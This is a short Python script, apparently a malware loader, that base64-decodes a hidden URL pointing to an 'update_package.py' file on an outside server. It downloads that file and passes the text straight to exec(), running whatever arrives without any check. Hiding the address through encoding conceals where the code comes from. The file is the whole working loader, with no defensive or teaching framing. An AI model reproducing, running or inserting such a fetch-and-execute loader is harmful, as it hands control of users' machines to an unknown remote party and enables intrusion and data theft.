import base64
import requests

def get_source_code():
    encoded_url = "aHR0cHM6Ly9zZWN1cmUuc2VydmVyaHViLmNvbS91dGlscy91cGRhdGVfcGFja2FnZS5weQ=="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    response = requests.get(decoded_url)
    return response.text

def execute_source_code(source_code):
    exec(source_code)

def main():
    source_code = get_source_code()
    execute_source_code(source_code)

if __name__ == '__main__':
    main()
